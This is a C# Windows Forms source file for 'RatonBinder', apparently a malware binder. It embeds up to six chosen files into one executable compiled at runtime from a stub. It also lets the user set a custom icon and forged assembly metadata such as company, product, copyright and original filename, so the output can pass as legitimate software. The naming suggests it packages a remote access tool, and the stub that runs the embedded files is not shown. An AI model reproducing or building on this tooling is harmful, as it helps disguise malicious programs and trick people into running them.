using DarkModeForms;
using Raton.Classes;
using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Diagnostics;

namespace RatonBinder
{
    public partial class Form1 : Form
    {
        public static string iconPath = null;
        public static string asmProduct = null;
        public static string asmDescription = null;
        public static string asmCompany = null;
        public static string asmCopyright = null;
        public static string asmOriginalFilename = null;
        public static string asmVersion = null;

        public Form1()
        {
            InitializeComponent();
            DarkMode.Start(this);
        }

        private void Form1_Load(object sender, EventArgs e) { }

        // ---------------- FILES ----------------

        private void button1_Click(object sender, EventArgs e)
        {
            if (listBox1.Items.Count >= 6)
            {
                Messenger.MessageBox("The binder only allows 6 files", "Limit",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            using (OpenFileDialog dialog = new OpenFileDialog())
            {
                dialog.Filter = "All Files (*.*)|*.*";

                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    if (!listBox1.Items.Contains(dialog.FileName))
                        listBox1.Items.Add(dialog.FileName);
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            for (int i = listBox1.SelectedIndices.Count - 1; i >= 0; i--)
                listBox1.Items.RemoveAt(listBox1.SelectedIndices[i]);
        }

        // ---------------- ASSEMBLY UI ----------------

        private void button3_Click(object sender, EventArgs e)
        {
            using (Form2 f = new Form2())
            {
                if (f.ShowDialog() == DialogResult.OK)
                {
                    asmDescription = f.AsmDescription;
                    asmProduct = f.AsmProduct;
                    asmCompany = f.AsmCompany;
                    asmOriginalFilename = f.AsmOriginalFilename;
                    asmCopyright = f.AsmCopyright;
                    asmVersion = f.AsmVersion;

                    Messenger.MessageBox("Assembly info loaded!", "Assembly",
                        MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dialog = new OpenFileDialog())
            {
                dialog.Filter = "Icon files (*.ico)|*.ico";

                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    iconPath = dialog.FileName;

                    Messenger.MessageBox("Icon selected!", "Icon",
                        MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        // ---------------- CORE ----------------

        private string EscapeForCSharp(string input)
        {
            if (string.IsNullOrEmpty(input))
                return "";

            return input
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"");
        }

        private string BuildAssemblyInfo()
        {
            if (string.IsNullOrEmpty(asmOriginalFilename))
                return "";

            string title = EscapeForCSharp(asmOriginalFilename ?? "");
            string product = EscapeForCSharp(asmProduct ?? "");
            string desc = EscapeForCSharp(asmDescription ?? "");
            string company = EscapeForCSharp(asmCompany ?? "");
            string copyright = EscapeForCSharp(asmCopyright ?? "");
            string version = string.IsNullOrEmpty(asmVersion) ? "1.0.0.0" : EscapeForCSharp(asmVersion);

            return
$@"
[assembly: System.Reflection.AssemblyTitle(""{title}"")]
[assembly: System.Reflection.AssemblyProduct(""{product}"")]
[assembly: System.Reflection.AssemblyDescription(""{desc}"")]
[assembly: System.Reflection.AssemblyCompany(""{company}"")]
[assembly: System.Reflection.AssemblyCopyright(""{copyright}"")]
[assembly: System.Reflection.AssemblyTrademark("""")]
[assembly: System.Reflection.AssemblyVersion(""{version}"")]
[assembly: System.Reflection.AssemblyFileVersion(""{version}"")]
";
        }

        private void BuildStub(string outputExe)
        {
            var provider = new CSharpCodeProvider();
            var parameters = new CompilerParameters();

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputExe;

            string options = "/target:winexe";

            if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                options += " /win32icon:\"" + iconPath + "\"";

            parameters.CompilerOptions = options;
            parameters.IncludeDebugInformation = false;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            foreach (string file in listBox1.Items)
                parameters.EmbeddedResources.Add(file);

            string stubCode = File.ReadAllText(Path.Combine(Application.StartupPath, "Stub", "Stub.cs"));

            string asmInfo = BuildAssemblyInfo();
            if (!string.IsNullOrEmpty(asmInfo))
            {
                int namespaceIndex = stubCode.IndexOf("namespace ");
                if (namespaceIndex != -1)
                    stubCode = stubCode.Insert(namespaceIndex, asmInfo + "\n");
            }

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, stubCode);

            if (results.Errors.HasErrors)
            {
                string err = "";
                foreach (CompilerError e in results.Errors)
                    err += $"Line {e.Line}: {e.ErrorText}\n";

                throw new Exception(err);
            }
        }

        // ---------------- BUILD ----------------

        private void button4_Click(object sender, EventArgs e)
        {
            if (listBox1.Items.Count == 0)
            {
                Messenger.MessageBox("Add at least one file first");
                return;
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "Save binded executable";
                sfd.Filter = "Executable (*.exe)|*.exe";
                sfd.FileName = "ratonBinded.exe";
                sfd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                if (sfd.ShowDialog() != DialogResult.OK)
                    return;

                try
                {
                    BuildStub(sfd.FileName);


                    Messenger.MessageBox("Build completed!", "RatonBinder",
                        MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    Messenger.MessageBox("Build error:\n" + ex.Message, "RatonBinder",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/S-illy/ratonBinder");
        }
    }
}
